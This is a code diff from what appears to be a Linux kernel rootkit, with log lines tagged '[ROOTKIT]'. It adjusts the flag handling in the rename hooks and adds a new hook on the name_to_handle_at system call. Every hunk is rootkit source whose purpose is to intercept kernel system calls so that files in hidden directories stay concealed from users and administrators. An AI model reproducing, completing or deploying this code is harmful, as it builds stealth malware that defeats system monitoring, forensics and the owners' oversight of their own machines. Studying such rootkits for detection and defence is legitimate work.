@@ -11,14 +11,14 @@
 static inline long do_rename(const sysfun_t orig_func, struct pt_regs *const p_regs,
                              const int i32_olddfd, const char __user *const s_oldname,
                              const int i32_newdfd, const char __user *const s_newname,
-                             const unsigned int ui32_flags)
+                             const unsigned int ui32_at_flags)
 {
     // Check if the new file is in a hidden directory
     if (is_pathname_hidden(i32_newdfd, s_newname, LOOKUP_PARENTS)) {
         return -ENOENT;
     }
 
-    return do_check_hidden(orig_func, p_regs, i32_olddfd, s_oldname, ui32_flags);
+    return do_check_hidden(orig_func, p_regs, i32_olddfd, s_oldname, ui32_at_flags);
 }
 
 // sys_link syscall hook handler
@@ -92,8 +92,7 @@ SYSCALL_HOOK_HANDLER5(renameat2, orig_renameat2, p_regs, int, i32_olddfd, const 
         return -EINVAL;
     }
 
-    return do_rename(orig_renameat2, p_regs, i32_olddfd, s_oldname, i32_newdfd, s_newname,
-                     ui32_flags);
+    return do_rename(orig_renameat2, p_regs, i32_olddfd, s_oldname, i32_newdfd, s_newname, 0);
 }
 
 // sys_mkdir syscall hook handler
@@ -138,4 +137,19 @@ SYSCALL_HOOK_HANDLER1(rmdir, orig_rmdir, p_regs, const char __user *, s_pathname
     pr_info("[ROOTKIT] rmdir(%p)\n", s_pathname);
 
     return do_check_hidden(orig_rmdir, p_regs, AT_FDCWD, s_pathname, 0);
+}
+
+// sys_name_to_handle_at syscall hook handler
+SYSCALL_HOOK_HANDLER5(name_to_handle_at, orig_name_to_handle_at, p_regs, int, i32_dfd,
+                      const char __user *, s_name, struct file_handle __user *, p_handle,
+                      int __user *, pi32_mnt_id, int, i32_flag)
+{
+    pr_info("[ROOTKIT] name_to_handle_at(%d, %p, %p, %p, %s%#x)\n", i32_dfd, s_name, p_handle,
+            pi32_mnt_id, SIGNED_ARG(i32_flag));
+
+    if ((i32_flag & ~(AT_SYMLINK_FOLLOW | AT_EMPTY_PATH)) != 0) {
+        return -EINVAL;
+    }
+
+    return do_check_hidden(orig_name_to_handle_at, p_regs, i32_dfd, s_name, i32_flag);
 }
